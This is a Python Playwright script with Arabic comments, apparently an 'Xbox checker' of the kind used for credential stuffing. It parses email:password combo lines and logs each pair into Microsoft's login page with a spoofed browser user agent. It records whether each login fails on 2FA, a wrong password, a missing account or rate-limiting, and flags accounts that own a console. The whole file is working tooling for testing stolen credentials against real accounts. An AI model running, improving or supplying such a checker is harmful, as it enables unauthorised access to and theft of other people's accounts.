# xbox_checker.py - نسخة محسنة بالكامل
import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 120000  # 120 ثانية

async def find_email_field(page):
    """البحث عن حقل البريد الإلكتروني بعدة طرق"""
    selectors = [
        "input[type='email']",
        "input[name='loginfmt']",
        "input[id='i0116']",
        "input[placeholder*='Email']",
        "input[placeholder*='Phone']",
        "input[placeholder*='البريد']"
    ]
    for selector in selectors:
        try:
            element = await page.wait_for_selector(selector, timeout=5000)
            if element:
                return element
        except:
            continue
    return None

async def find_password_field(page):
    """البحث عن حقل كلمة المرور بعدة طرق"""
    selectors = [
        "input[type='password']",
        "input[name='passwd']",
        "input[id='i0118']"
    ]
    for selector in selectors:
        try:
            element = await page.wait_for_selector(selector, timeout=5000)
            if element:
                return element
        except:
            continue
    return None

async def click_submit_button(page):
    """النقر على زر التالي أو تسجيل الدخول"""
    selectors = [
        "input[type='submit']",
        "button[type='submit']",
        "button:has-text('Next')",
        "button:has-text('Sign in')",
        "button:has-text('التالي')",
        "button:has-text('تسجيل الدخول')"
    ]
    for selector in selectors:
        try:
            button = await page.wait_for_selector(selector, timeout=3000)
            if button:
                await button.click()
                return True
        except:
            continue
    # محاولة الضغط على Enter إذا كان الحقل نشطًا
    await page.keyboard.press("Enter")
    return True

async def handle_2fa_or_error(page) -> Tuple[bool, str]:
    """التحقق من وجود 2FA أو رسائل خطأ معروفة"""
    body = await page.inner_text('body')
    lower_body = body.lower()
    if any(word in lower_body for word in ["enter code", "verification code", "authenticator", "تحقق", "رمز"]):
        return True, "يتطلب رمز التحقق (2FA)"
    if "incorrect password" in lower_body or "wrong password" in lower_body:
        return True, "كلمة مرور خاطئة"
    if "account doesn't exist" in lower_body or "couldn't find" in lower_body:
        return True, "الحساب غير موجود"
    if "too many attempts" in lower_body:
        return True, "محاولات كثيرة، تم الحظر مؤقتًا"
    return False, ""

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-setuid-sandbox'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = await context.new_page()
        
        # 1. الذهاب إلى رابط تسجيل الدخول المباشر
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles&id=292540"
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        
        # 2. الانتظار قليلاً للسماح لأي إعادة توجيه
        await asyncio.sleep(3)
        
        # 3. البحث عن حقل البريد الإلكتروني
        email_field = await find_email_field(page)
        if not email_field:
            # قد تكون الصفحة مختلفة (مثلاً "Use another account")
            # نحاول النقر على رابط "Use another account" إن وجد
            try:
                use_another = await page.wait_for_selector("a:has-text('Use another account')", timeout=5000)
                if use_another:
                    await use_another.click()
                    await asyncio.sleep(2)
                    email_field = await find_email_field(page)
            except:
                pass
            if not email_field:
                result['console_info'] = "لم يتم العثور على حقل البريد الإلكتروني (تأكد من الاتصال بالإنترنت)"
                await browser.close()
                await p.stop()
                return result
        
        # إدخال البريد
        await email_field.fill(account['email'])
        await asyncio.sleep(2)
        
        # النقر على زر "التالي"
        await click_submit_button(page)
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(3)
        
        # 4. التحقق من 2FA أو أخطاء بعد إدخال البريد
        is_error, error_msg = await handle_2fa_or_error(page)
        if is_error:
            result['console_info'] = error_msg
            await browser.close()
            await p.stop()
            return result
        
        # 5. البحث عن حقل كلمة المرور
        password_field = await find_password_field(page)
        if not password_field:
            result['console_info'] = "لم يتم العثور على حقل كلمة المرور"
            await browser.close()
            await p.stop()
            return result
        
        await password_field.fill(account['password'])
        await asyncio.sleep(2)
        
        # النقر على زر تسجيل الدخول
        await click_submit_button(page)
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(4)
        
        # 6. التعامل مع نافذة "البقاء مسجلاً" إن ظهرت
        try:
            stay_signed_in = await page.wait_for_selector("input[value='Yes']", timeout=5000)
            if stay_signed_in:
                await stay_signed_in.click()
                await asyncio.sleep(2)
        except:
            pass
        
        # 7. بعد تسجيل الدخول، التوجه إلى صفحة الأجهزة
        console_url = "https://www.xbox.com/en-US/play/consoles"
        for attempt in range(3):
            try:
                await page.goto(console_url, timeout=60000)
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(3)
                text = (await page.inner_text('body')).lower()
                if "play your console remotely" in text:
                    result['success'] = True
                    result['has_console'] = True
                    result['console_info'] = "يوجد جهاز"
                    break
                elif "set up your console" in text:
                    result['success'] = True
                    result['has_console'] = False
                    result['console_info'] = "مسجل ولا يوجد جهاز"
                    break
                elif "sign in to finish setting up" in text:
                    result['success'] = False
                    result['has_console'] = False
                    result['console_info'] = "تسجيل دخول غير مكتمل"
                    break
                else:
                    # قد تكون الصفحة لم تتحمل بعد
                    await asyncio.sleep(2)
            except:
                continue
        else:
            result['console_info'] = "لم يتم العثور على جهاز أو فشل التحميل"
        
        await browser.close()
        await p.stop()
        
    except PlaywrightTimeoutError:
        result['console_info'] = "انتهت المهلة أثناء تسجيل الدخول (قد يكون الإنترنت بطيئًا أو الموقع محجوب)"
        if p:
            await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ غير متوقع: {str(e)[:150]}"
        if p:
            await p.stop()
    
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
